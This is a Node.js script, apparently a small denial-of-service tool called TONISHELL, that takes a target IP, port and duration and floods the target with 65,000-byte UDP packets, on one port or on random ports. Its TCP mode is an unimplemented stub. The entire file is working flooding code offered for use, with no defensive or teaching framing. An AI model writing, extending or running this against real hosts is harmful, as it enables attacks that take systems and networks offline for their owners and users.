const net = require('net');
const dgram = require('dgram');
const args = process.argv.slice(2);

const VERSION = 0.2;

function print(string) {
    console.log(`[TONISHELL v${VERSION}]: ${string}`);
}

function printSyntax(id) {
    switch (id) {
        case 1:
            print('Please specify a valid protocol.');
            break;
        case 2:
            print('Please specify a IP address');
            break;
        case 3:
            print('Please specify a valid port or type in 0 for a random port.');
            break;
        case 4:
            print('Please specify a valid time.');
            break;
    }

    print('Syntax: node shell.js <tcp/udp/udpmix> <ip> <port/0 = random> <time in secs>');
}

function validateIP(ip) {
    if (/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)) {
        return true;
    }
    return false;
}

function getRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

async function sleep(time) {
    return new Promise((resolve) => setTimeout(resolve, time));
}

function getAttackMessage() {
    let message = ';';

    for (let i = 0; i < 65000; i++) {
        message += 'X';
    }

    return message;
}

function tcp(ip, port, time) {
    let packets = 0;

    const end = Date.now() + time;

    while (true) {
        if (Date.now() > end) break;
    }

    return packets;
}

function udp(ip, port, time) {
    let packets = 0;

    const end = Date.now() + time;
    const msg = Buffer.from(getAttackMessage());

    try {
        let client = dgram.createSocket('udp4');

        while (true) {
            client.send(msg, port, ip);
            packets++;
            if (Date.now() > end) break;
        }

        client.close();
    } catch (error) {
        print(`ERROR: ${error}`);
    }

    return packets;
}

async function udpmix(ip, time) {
    let packets = 0;

    const end = Date.now() + time;
    const msg = Buffer.from(getAttackMessage());

    try {
        let client = await dgram.createSocket('udp4');

        while (true) {
            const port = await getRandomNumber(1, 65000);

            client.send(msg, 0, msg.length, port, ip, (error, bytes) => {
                if (error) {
                    print(`ERROR: ${error}`);
                } else {
                    packets++;
                }
            });

            await sleep(1);
            if (Date.now() > end) break;
        }
    } catch (error) {
        print(`TRY-CATCH-ERROR: ${error}`);
    }

    return packets;
}

if (args.length !== 4) {
    printSyntax(0);
    return;
}

if (args[0] !== 'tcp' && args[0] !== 'udp' && args[0] !== 'udpmix') {
    printSyntax(1);
    return;
}

if (!validateIP(args[1])) {
    printSyntax(2);
    return;
}

if (isNaN(args[2]) || args[2] < 0 || args[2] > 65000) {
    printSyntax(3);
    return;
}

if (isNaN(args[3])) {
    printSyntax(4);
    return;
}

const proto = args[0];
const ip = args[1];
const port = Number(args[2]) === 0 ? getRandomNumber(1, 65000) : Number(args[2]);
const time = Number(args[3]) * 1000;

async function main() {
    if (proto === 'tcp') {
        print(`TCP is not implemented yet. Please use UDP it's more fun. Haha.`);
    } else if (proto === 'udp') {
        print(`Flooding UDP on PORT (1 - 65000)...`);

        let packetsSent = await udp(ip, port, time);
        let dataSent = ((packetsSent * 65000) / 1024 / 1024).toFixed(2);

        print(`Done. Packets Sent: ${packetsSent} (${dataSent} MB).`);
    } else if (proto === 'udpmix') {
        print(`Flooding UDPMIX on PORT ${port}...`);

        let packetsSent = await udpmix(ip, time);
        let dataSent = ((packetsSent * 65000) / 1024 / 1024).toFixed(2);

        print(`Done. Packets Sent: ${packetsSent} (${dataSent} MB).`);
    }
}

main();
